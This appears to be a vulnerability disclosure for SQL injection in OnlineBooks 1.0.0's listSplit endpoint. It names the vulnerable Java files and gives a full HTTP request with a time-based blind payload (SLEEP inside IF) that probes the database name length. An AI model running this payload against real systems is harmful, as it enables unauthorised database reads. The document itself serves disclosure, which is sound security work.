# In the OnlineBooks 1.0.0 version, the '/pages/back/books/BooksServlet/listSplit' interface is vulnerable to Structured Query Language Injection. This interface concatenates the request parameter 'column' into an SQL statement. An attacker can manipulate the WHERE clause or append a UNION query, thereby tricking the backend database into executing unintended commands. The attacker can then read any data from the database.



**Files:**

`src/cn/ylcto/book/servlet/BooksServlet.java`

`column`参数通过请求参数获取，是可控的，

![image-20260731163202507](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260731163202507.png)



`src/cn/ylcto/book/DAO/impl/BooksDAOImpl.java`

The SQL main clause of the getAllCount method concatenates column values directly, which poses a SQL injection vulnerability

![image-20260731163634208](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260731163634208.png)



```
GET /pages/back/books/BooksServlet/listSplit?col=name+AND+IF(LENGTH(database())=10,SLEEP(5),0)&kw=a&cp=1&ls=5 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Referer: http://localhost:8080/pages/back/books/BooksServlet/listSplit?cp=2&ls=1&null=null
Cookie: JSESSIONID=40600D1B090A7939B3EF02E256A962F4
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i


```

Determine its database length through time-delay injection

![image-20260731173307004](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260731173307004.png)